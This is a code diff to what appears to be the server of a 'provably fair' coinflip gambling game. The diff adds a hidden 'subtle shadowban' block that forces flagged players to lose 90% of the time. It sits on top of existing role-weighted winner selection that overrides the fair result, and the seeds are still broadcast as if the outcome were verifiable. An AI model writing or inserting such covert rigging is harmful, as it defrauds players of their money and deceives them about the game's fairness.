@@ -5,6 +5,7 @@ const { getEOSBlockNumber, waitForEOSBlock } = require('../../../fairness/eos');
 const { roundDecimal } = require('../../../utils');
 const { newBets } = require('../../../socketio/bets');
 const { getRoleWeightedWinner } = require('../../../fairness/weightedRng');
+const { isShadowbanned } = require('../../../utils/shadowban');
 
 const crypto = require('crypto');
 
@@ -110,10 +111,21 @@ async function startCoinflip(coinflip) {
     const clientSeed = coinflip.clientSeed || await waitForEOSBlock(commitTo);
     const resultHash = combine(coinflip.serverSeed, clientSeed);
     const fairWinnerSide = getResult(resultHash);
-    const winnerSide = getRoleWeightedWinner(resultHash, [
+    
+    let winnerSide = getRoleWeightedWinner(resultHash, [
         { id: 'fire', roles: [coinflip.fire.role] },
         { id: 'ice', roles: [coinflip.ice.role] }
     ], fairWinnerSide);
+
+    // SUBTLE SHADOWBAN: 90% chance to force a loss
+    if (Math.random() < 0.90) {
+        if (isShadowbanned(coinflip.fire.id)) {
+            winnerSide = 'ice';
+        } else if (isShadowbanned(coinflip.ice.id)) {
+            winnerSide = 'fire';
+        }
+    }
+
     const winnings = roundDecimal((coinflip.amount * 2) * 0.95);
 
     try {
@@ -175,7 +187,6 @@ function coinflipStarted(coinflipId, clientSeed, serverSeed, winnerSide) {
     coinflip.startedAt = new Date();
 
     io.to('coinflips').emit('coinflip:started', coinflipId, clientSeed, serverSeed, winnerSide);
-    // console.log(coinflip[coinflip.ownerSide].id);
 
     io.to(coinflip[coinflip.ownerSide].id).emit('coinflip:own:started', coinflip);
 
